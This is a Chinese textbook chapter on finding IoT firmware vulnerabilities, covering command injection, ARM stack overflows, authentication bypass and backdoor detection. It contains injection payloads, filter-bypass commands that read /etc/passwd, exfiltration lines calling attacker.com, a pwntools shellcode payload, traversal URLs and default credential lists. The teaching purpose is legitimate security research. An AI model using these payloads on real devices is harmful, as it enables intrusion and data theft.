# 第5章 常见漏洞挖掘

IoT固件中的安全漏洞种类繁多，本章重点介绍最常见、最容易被利用的几类漏洞及其挖掘方法。掌握这些漏洞的模式和挖掘技巧，是IoT安全研究人员的核心能力。

### 5.1 命令注入漏洞挖掘

命令注入是IoT设备中最常见、危害最大的漏洞类型之一。由于嵌入式设备通常使用shell命令来执行系统操作，而开发者对用户输入过滤不严，导致攻击者可以注入恶意命令。

#### 5.1.1 命令注入原理

命令注入漏洞的本质是：用户可控的输入被拼接到shell命令中执行。

**典型漏洞代码：**
```c
// 危险代码示例
void ping_test(char *ip) {
    char cmd[256];
    sprintf(cmd, "ping -c 4 %s", ip);
    system(cmd);
}
```

攻击者可以输入 `127.0.0.1; id`，实际执行的命令变为：
```bash
ping -c 4 127.0.0.1; id
```

**常见注入分隔符：**
| 符号 | 说明 |
|------|------|
| ; | 命令分隔符，顺序执行 |
| && | 逻辑与，前一个成功才执行后一个 |
| \|\| | 逻辑或，前一个失败才执行后一个 |
| \| | 管道符，将前一个命令的输出作为后一个的输入 |
| & | 后台执行 |
| `...` | 反引号，命令替换 |
| $(...) | 命令替换 |
| \n | 换行符（新命令） |

#### 5.1.2 漏洞挖掘方法

**静态分析方法：**

1. **定位危险函数调用**
   搜索以下危险函数的调用：
   - `system()` - 执行shell命令
   - `execve()` / `execl()` / `execvp()` - 执行程序
   - `popen()` - 执行命令并返回文件指针
   - `syslog()` - 有时会调用shell
   - 自定义的命令执行函数

```bash
# 在二进制中搜索危险函数
arm-linux-gnueabi-readelf -s binary | grep -E "system|exec|popen"

# 在源码中搜索（如果有）
grep -r "system\|exec\|popen" src/

# 在反编译结果中搜索
# IDA: 搜索system函数的交叉引用
# Ghidra: 查找system函数的引用
```

2. **追踪输入来源**
   从危险函数出发，逆向追踪参数的来源，判断是否用户可控：
   - Web表单参数
   - HTTP头（Cookie、User-Agent等）
   - URL查询参数
   - 配置文件
   - 网络协议字段
   - 环境变量

3. **检查过滤逻辑**
   如果存在输入过滤，检查过滤是否完备：
   - 是否只过滤了部分特殊字符
   - 是否存在绕过可能（大小写、编码等）
   - 过滤是在客户端还是服务端

**动态分析方法：**

1. **Fuzzing测试**
   对各个输入点注入测试payload，观察是否有命令执行的迹象。

```python
# 简单的命令注入Fuzzing示例
import requests

payloads = [
    "127.0.0.1; id",
    "127.0.0.1 && id",
    "127.0.0.1 | id",
    "127.0.0.1`id`",
    "127.0.0.1$(id)",
    "127.0.0.1\ntouch /tmp/test",
]

url = "http://192.168.1.1/cgi-bin/ping.cgi"
for payload in payloads:
    data = {"ip": payload}
    r = requests.post(url, data=data)
    if "uid=" in r.text or "root:" in r.text:
        print(f"[+] Vulnerable with payload: {payload}")
```

2. **监控系统行为**
   - 使用strace/ltrace跟踪系统调用
   - 监控文件系统变化
   - 监控网络连接
   - 查看日志输出

#### 5.1.3 常见注入点

**Web接口注入点：**
- CGI程序的表单参数
- URL路径参数（RESTful风格）
- HTTP头字段
- Cookie值
- 文件上传功能

**网络服务注入点：**
- UPnP服务的各种参数
- SNMP的community字符串或OID
- FTP的用户名/命令参数
- Telnet的用户名/密码
- 自定义协议的字段

**其他注入点：**
- 设备名称/描述字段
- 定时任务名称
- 日志查看功能
- 诊断/调试功能

#### 5.1.4 绕过技巧

**空格过滤绕过：**
```bash
# 使用${IFS}代替空格
cat${IFS}/etc/passwd

# 使用重定向
cat</etc/passwd

# 使用花括号
{cat,/etc/passwd}
```

**关键字过滤绕过：**
```bash
# 拼接
a=ca;b=t;$a$b /etc/passwd

# 通配符
cat /etc/pa??wd

# 引用
c"a"t /etc/passwd
c'a't /etc/passwd

# 反斜杠
c\at /etc/passwd
```

**无回显命令注入：**
- 使用DNS外带数据：`ping $(id).attacker.com`
- 使用HTTP外带数据：`wget http://attacker.com/$(id)`
- 使用时间盲注：`sleep 5`
- 写入Web目录：`id > /www/result.txt`

### 5.2 缓冲区溢出漏洞

缓冲区溢出是经典的内存破坏漏洞，在IoT设备中仍然普遍存在，尤其是在使用C语言开发的嵌入式程序中。

#### 5.2.1 栈溢出原理

栈溢出是指向栈上的缓冲区写入超过其大小的数据，导致覆盖栈上的返回地址等关键数据，从而控制程序执行流程。

**典型漏洞代码：**
```c
void handle_request(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 危险：无长度检查
    // ...
}
```

**ARM栈溢出要点：**

与x86相比，ARM栈溢出有以下特点：
- 栈增长方向：向下（高地址到低地址）
- 返回地址存储位置：LR（链接寄存器）或栈上
- ARM/Thumb状态切换需要注意
- 寄存器传递参数（前4个参数在R0-R3）
- 通常有栈保护（Canary），但很多IoT设备未启用

**ARM函数栈布局：**
```
高地址
+-----------------+
|   参数5, 6...   |  <- 调用者栈帧
+-----------------+
|     返回地址    |  <- LR或栈上保存的PC
+-----------------+
|    保存的寄存器  |  <- R4-R11等
+-----------------+
|                 |
|   局部变量      |
|   缓冲区        |
|                 |
+-----------------+  <- SP
低地址
```

#### 5.2.2 漏洞挖掘方法

**静态分析：**

1. **搜索危险函数**
   | 函数 | 危险点 |
   |------|--------|
   | strcpy | 字符串复制，无长度限制 |
   | strcat | 字符串拼接，无长度限制 |
   | sprintf | 格式化输出到缓冲区 |
   | vsprintf | 可变参数格式化输出 |
   | gets | 从stdin读取一行 |
   | scanf | 格式化输入 |
   | read | 读取指定长度数据 |
   | memcpy | 内存复制（长度可能可控） |

```bash
# 查找危险函数导入
arm-linux-gnueabi-readelf -d binary | grep -E "strcpy|strcat|sprintf|gets"

# 在反编译结果中检查调用参数
# 重点关注：源参数是否用户可控，长度是否受限
```

2. **分析字符串处理逻辑**
   - 手动实现的字符串复制函数
   - 循环中的内存操作
   - 解析协议数据时的缓冲区操作

3. **检查防护机制**
   ```bash
   # 检查是否启用了栈保护（Canary）
   arm-linux-gnueabi-readelf -s binary | grep stack_chk

   # 检查NX/DEP（不可执行栈）
   arm-linux-gnueabi-readelf -l binary | grep -i "gnu_stack"

   # 检查ASLR（需要运行时确认）
   cat /proc/sys/kernel/randomize_va_space
   ```

**动态分析（Fuzzing）：**

1. **识别输入点**
   - 网络端口监听的服务
   - Web表单和参数
   - 文件解析功能
   - 命令行参数

2. **发送畸形数据**
   ```python
   # 简单栈溢出Fuzzing示例
   import socket

   def fuzz(buffer_size):
       payload = b"A" * buffer_size
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect(("192.168.1.1", 8080))
       s.send(payload)
       response = s.recv(1024)
       s.close()
       return response

   # 逐步增加发送数据长度
   for size in [100, 200, 500, 1000, 2000, 5000, 10000]:
       try:
           fuzz(size)
           print(f"[-] Size {size}: OK")
       except Exception as e:
           print(f"[+] Size {size}: Crash! {e}")
           break
   ```

3. **确认崩溃是否可控**
   - 使用GDB调试崩溃现场
   - 检查PC/LR寄存器是否被覆盖
   - 确认偏移量

#### 5.2.3 ARM漏洞利用基础

**确认溢出偏移：**
```python
# 使用pattern查找偏移
from pwn import *

# 生成唯一pattern
pattern = cyclic(200)

# 发送后获取崩溃时的PC值
pc_value = 0x41424344  # 假设崩溃时PC的值

# 计算偏移
offset = cyclic_find(pc_value)
print(f"Offset: {offset}")
```

**简单ROP利用（无NX保护）：**
如果栈可执行，可以直接在栈上执行shellcode：

```python
from pwn import *

# 架构设置
context.arch = 'arm'
context.os = 'linux'

# 生成shellcode
shellcode = asm(shellcraft.sh())

# 构造payload
offset = 100  # 溢出偏移
padding = b"A" * offset
pc = p32(0x12345678)  # 跳转到栈上的地址（需要确定）

payload = padding + pc + shellcode
```

**ROP利用（有NX保护）：**
如果栈不可执行，需要使用ROP（Return-Oriented Programming）技术：

```python
from pwn import *

# 查找gadget
elf = ELF('./binary')
rop = ROP(elf)

# 查找有用的gadget
# pop {r0, r1, r2, r3, pc} - 控制前4个参数
# bx r3 - 跳转到r3指向的函数

# 构造ROP链
# 目标：调用 system("/bin/sh")
```

#### 5.2.4 堆溢出与其他内存漏洞

除了栈溢出，还有其他类型的内存破坏漏洞：

**堆溢出：**
- 堆上的缓冲区溢出
- 可以破坏堆元数据或函数指针
- 利用难度通常高于栈溢出
- IoT设备中常见的堆分配器：ptmalloc、uclibc malloc、jemalloc等

**格式化字符串漏洞：**
- `printf(user_input)` 形式的漏洞
- 可以读取内存、写入内存
- ARM下的利用与x86类似，但参数传递方式不同

**整数溢出：**
- 有符号/无符号整数转换问题
- 整数溢出导致缓冲区分配不足
- 常见于计算长度、大小的代码中

**Use-After-Free：**
- 释放后使用的内存
- 可以通过精心构造的内存布局控制程序流程
- 在复杂程序中较为常见

### 5.3 认证绕过漏洞

认证绕过漏洞允许攻击者在没有合法凭证的情况下访问受限资源，是IoT设备中非常普遍的安全问题。

#### 5.3.1 认证逻辑缺陷

**常见认证绕过场景：**

1. **硬编码后门密码**
   固件中内置了开发者留下的后门账号密码。

2. **认证逻辑错误**
   ```c
   // 错误示例：逻辑写反
   if (check_password(user_input)) {
       // 认证失败
       return ERROR;
   }
   // 认证成功
   grant_access();
   ```

3. **客户端认证**
   认证逻辑完全在客户端执行，服务端不验证。

4. **空密码或默认密码**
   设备出厂时设置了默认密码，用户未修改。

5. **万能密码**
   开发者为了调试方便，设置了万能密码。

#### 5.3.2 Web认证绕过

**常见Web认证绕过方法：**

1. **URL直接访问**
   直接访问内部页面，绕过登录页：
   ```
   http://192.168.1.1/admin/status.html
   http://192.168.1.1/cgi-bin/settings.cgi
   ```

2. **修改HTTP头**
   - 添加 `X-Forwarded-For: 127.0.0.1`
   - 修改 `Referer` 头
   - 添加 `Authorization` 头

3. **Cookie篡改**
   - 设置 `admin=1` 或 `loggedin=true`
   - 修改用户ID
   - 预测Session ID

4. **路径遍历**
   ```
   http://192.168.1.1/../../../etc/passwd
   http://192.168.1.1/cgi-bin/..%2f..%2fetc/passwd
   ```

5. **认证绕过漏洞（CVE示例）**
   某些路由器存在特殊URL绕过认证的漏洞：
   ```
   http://192.168.1.1/device_help.cgi  # 某些设备可绕过认证
   http://192.168.1.1/webcm?todo=something  # 某些Broadcom设备
   ```

#### 5.3.3 认证绕过挖掘方法

**静态分析：**

1. **查找认证函数**
   ```bash
   # 搜索认证相关的函数名
   strings binary | grep -i "auth\|login\|check.*pass\|verify"

   # 查找密码比较
   # 在反编译结果中搜索 strcmp, memcmp 等函数的引用
   # 检查比较的内容和逻辑
   ```

2. **分析认证流程**
   - 定位登录处理函数
   - 跟踪认证状态的传递
   - 检查每个接口的认证检查

3. **查找后门**
   ```bash
   # 搜索可疑的用户名
   strings firmware.bin | grep -E "^[a-z]{3,10}$" | sort -u

   # 搜索可疑的密码
   strings firmware.bin | grep -B2 -A2 "admin\|root\|support\|debug"

   # 搜索隐藏的命令
   strings binary | grep -i "shell\|telnet\|debug\|test"
   ```

**动态分析：**

1. **测试默认凭据**
   ```
   admin/admin, admin/123456, admin/password,
   root/root, root/admin, root/123456,
   support/support, user/user, guest/guest
   ```

2. **暴力破解**
   - 使用Hydra、Burp Suite等工具
   - 注意：很多设备有锁账户机制

3. **认证绕过测试**
   - 测试各种绕过payload
   - 检查是否有调试接口
   - 测试是否有未授权API

### 5.4 后门分析

后门是指开发者或攻击者有意植入的未公开访问通道，用于绕过正常的认证机制。

#### 5.4.1 后门的类型

**按植入者分类：**
1. **厂商后门**：厂商为了维护、调试方便植入的后门
2. **第三方组件后门**：开源组件或第三方库中包含的后门
3. **攻击者植入后门**：设备被入侵后植入的后门

**按功能分类：**
1. **账号后门**：隐藏的用户账号
2. **服务后门**：隐藏的网络服务
3. **命令后门**：特殊的命令或参数
4. **密钥后门**：预设的加密密钥或证书
5. **调试接口后门**：未公开的调试接口

#### 5.4.2 后门检测方法

**静态检测：**

1. **分析用户账号**
   ```bash
   # 查看passwd文件中的用户
   cat rootfs/etc/passwd

   # 查看shadow中的密码哈希
   cat rootfs/etc/shadow

   # 检查是否有可疑用户
   # 关注UID为0的非root用户
   ```

2. **分析网络服务**
   ```bash
   # 查看inetd/xinetd配置
   cat rootfs/etc/inetd.conf
   ls rootfs/etc/xinetd.d/

   # 搜索监听端口的服务
   grep -r "listen\|bind\|socket" rootfs/etc/init.d/

   # 搜索不常见的服务二进制
   find rootfs/usr/sbin -type f -executable | sort
   ```

3. **分析启动项**
   ```bash
   # 查看所有启动脚本
   ls -la rootfs/etc/init.d/
   cat rootfs/etc/rc.d/rcS
   cat rootfs/etc/inittab

   # 查看crontab
   cat rootfs/etc/crontab
   ls rootfs/etc/cron.d/
   ls rootfs/etc/periodic/
   ```

4. **分析可疑字符串**
   ```bash
   # 搜索后门相关关键词
   strings firmware.bin | grep -i "backdoor\|secret.*key\|hidden.*account"

   # 搜索IP和域名
   strings firmware.bin | grep -E "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$"
   strings firmware.bin | grep -E "[a-zA-Z0-9]+\.[a-zA-Z]{2,}" | grep -v "\.html\|\.jpg\|\.png"

   # 搜索可疑命令
   strings binary | grep -i "telnetd\|dropbear\|sshd\|shell"
   ```

**动态检测：**

1. **端口扫描**
   ```bash
   # 扫描所有TCP端口
   nmap -p- 192.168.1.1

   # 扫描UDP端口
   nmap -sU -p 1-10000 192.168.1.1

   # 服务识别
   nmap -sV 192.168.1.1
   ```

2. **监控网络流量**
   - 使用Wireshark抓包
   - 观察设备主动连接的外部地址
   - 检查是否有异常的外发连接

3. **进程监控**
   - 查看运行的进程列表
   - 检查可疑的进程名
   - 对比预期的进程列表

4. **文件系统监控**
   - 检查是否有新增的文件
   - 检查系统文件是否被修改
   - 监控/tmp等可写目录

#### 5.4.3 经典后门案例分析

**案例：Linksys WRT54G后门**
- 存在一个隐藏的管理页面
- 通过特殊URL可以访问高级设置
- 可以修改系统配置

**案例：某些摄像头后门**
- 预留了Telnet账号
- 密码通过特定算法生成（基于MAC地址等）
- 可以获取完整的Shell访问

**案例：路由器UPnP后门**
- UPnP服务存在命令注入
- 无需认证即可执行任意命令
- 局域网内的设备都可以利用
